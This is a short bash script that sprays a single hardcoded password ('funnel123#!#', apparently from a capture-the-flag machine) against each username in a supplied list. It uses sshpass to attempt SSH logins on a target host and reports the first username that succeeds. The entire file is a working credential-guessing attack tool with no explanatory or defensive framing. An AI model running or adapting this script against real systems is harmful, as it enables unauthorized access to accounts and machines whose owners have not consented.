#!/bin/bash

PASSWORD='funnel123#!#';
TGT_MACH=$1;
USERLIST=$2;

if [[ ! -f "$USERLIST" ]]; then
	echo file: $USERLIST not found!;
	exit 1;
else 
	echo Using userlist: $USERLIST;
	if [[ -z "$TGT_MACH" ]]; then
		echo No user target machine specified!;
		exit 2;
	else echo Targeting address: $TGT_MACH;
	fi;
fi;
echo Using password: $PASSWORD && echo;
function report_success() {
	echo
	echo Username found!
	echo --------------
	echo " $1"
	echo --------------
	echo
	exit 0;
};
function main() {
	local attempt=1
	local list_len=$(cat $USERLIST | wc -l);

	while read username; do
		echo \($attempt\\$list_len\) $username;
		sshpass -p $PASSWORD ssh -oNumberOfPasswordPrompts=1 -l ${username} ${TGT_MACH} exit &>/dev/null && report_success $username
		(( attempt++ ));
	#	sleep 2;
		echo;
	done <$USERLIST;

	echo
	echo ------------------------------------------
	echo " No valid username found! Try a new list."
	echo ------------------------------------------
	echo
};
main;
exit 1;
